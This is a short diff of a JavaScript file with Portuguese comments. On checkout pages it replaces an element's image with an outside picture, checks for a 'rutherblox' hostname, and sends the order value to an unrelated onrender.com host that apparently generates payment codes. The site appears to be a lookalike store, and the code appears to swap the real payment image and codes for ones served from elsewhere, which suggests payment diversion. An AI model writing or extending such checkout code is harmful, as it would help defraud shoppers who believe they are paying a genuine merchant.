@@ -146,6 +146,7 @@ function copiarTextoClipboardAPI(texto) {
       
 
     if(window.location.href.includes(`checkout`)){
+        document.querySelector(`.sc-3fde0cab-12.cWMTgb`).src = `https://greenpng.com/wp-content/uploads/2020/06/untitleddesign_1_original-68-1-1024x1024.png`
         if(window.location.hostname.includes(`rutherblox`)){
             
         gtag('event', 'conversion', {
@@ -164,7 +165,7 @@ function copiarTextoClipboardAPI(texto) {
         const agora = new Date();
         //https://saddadsda.onrender.com/gen?val=50
         let decoded = decodeURIComponent(params.get(`val`));
-document.querySelector(`.sc-3fde0cab-12.cWMTgb`).src = `https://greenpng.com/wp-content/uploads/2020/06/untitleddesign_1_original-68-1-1024x1024.png`
+
   // Remove espaços (normais e NBSP) e troca vírgula por ponto
   let cleaned = decoded.replace(/\s| /g, '').replace(',', '.');
         fetch("https://saddadsda.onrender.com/gen?val="+cleaned, {
